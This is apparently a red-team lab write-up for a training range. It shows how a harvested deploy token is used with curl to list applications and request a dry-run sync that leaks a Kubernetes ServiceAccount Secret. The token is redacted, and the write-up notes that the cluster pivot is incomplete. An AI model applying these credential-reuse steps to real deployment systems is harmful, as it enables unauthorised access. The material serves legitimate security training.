# solve_red.md — M5 · dev-deploy
## Red Team Solution Writeup
**Range:** RNG-DEV-01 · VIKAS TANTRA
**Machine:** M5 — PUL Deploy Commander
**Vulnerability:** Dry-run API returns a manifest containing a ServiceAccount token
**MITRE ATT&CK:** T1552.001

---

## Objective

Use the Deploy Commander token retrieved from M4 to list applications and request a dry-run sync for `pul-ota-firmware`.

## Environment

| Item | Value |
|---|---|
| Deploy Commander | `203.0.3.36:8888` |
| API token source | `$RANGE3_DIR/sonar-settings.json` |
| Application | `pul-ota-firmware` |
| Reported cluster | `193.x.x.x:6443` (placeholder) |

## Step-by-Step Exploitation

### Step 1 — List applications

```bash
DEPLOY_TOKEN="$(jq -r '(if type == "array" then .[] else (.settings // .values // [])[] end) | select(.key == "sonar.ci.deploy_token") | .value' "$RANGE3_DIR/sonar-settings.json")"
curl --max-time 8 -fsS http://203.0.3.36:8888/api/applications \
     -H "Authorization: Bearer ${DEPLOY_TOKEN}" | jq .
```

The response includes `pul-ota-firmware`.

### Step 2 — Request a dry-run manifest

```bash
curl --max-time 8 -fsS -X POST \
     "http://203.0.3.36:8888/api/applications/pul-ota-firmware/sync?dryRun=true" \
     -H "Authorization: Bearer ${DEPLOY_TOKEN}" \
     -o "$RANGE3_DIR/dryrun.json"
jq '{result, warning, manifest_present: (.manifest != null)}' "$RANGE3_DIR/dryrun.json"
```

The API returned a dry-run manifest. No sync was applied to a cluster.

### Step 3 — Inspect the manifest without printing token data

```bash
jq -r '.manifest' "$RANGE3_DIR/dryrun.json" | grep -E 'kind: Secret|cluster_endpoint:|namespace:' | sed -E 's/(token:).*/\1 <redacted>/'
```

The manifest contains a ServiceAccount Secret and reports `https://193.x.x.x:6443`. That address is a placeholder, not a validated cluster endpoint.

### Step 4 — Cluster pivot status

The repository does not include RNG-CLD-01 provisioning or a real cluster address. The M5 Deploy Commander service and dry-run API work, but the Kubernetes pivot cannot be completed from the provided files. Do not use the placeholder kubeconfig or disable TLS verification.

## MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Credential Access | Unsecured Credentials: Credentials in Files | T1552.001 |
| Lateral Movement | Remote Services | T1021 |
| Discovery | Cloud Service Discovery | T1526 |

## Local cleanup

After completing the lab steps, remove the downloaded files and clear the shell variables:

```bash
rm -f "$RANGE3_DIR/docker-config.json" "$RANGE3_DIR/registry-config.json" "$RANGE3_DIR/sonarqube-access.env" "$RANGE3_DIR/sonar-settings.json" "$RANGE3_DIR/dryrun.json"
rmdir "$RANGE3_DIR"
unset REGISTRY_USER REGISTRY_PASSWORD_CANDIDATE MINIO_ACCESS_KEY MINIO_SECRET_KEY DEPLOY_TOKEN RANGE3_DIR
```
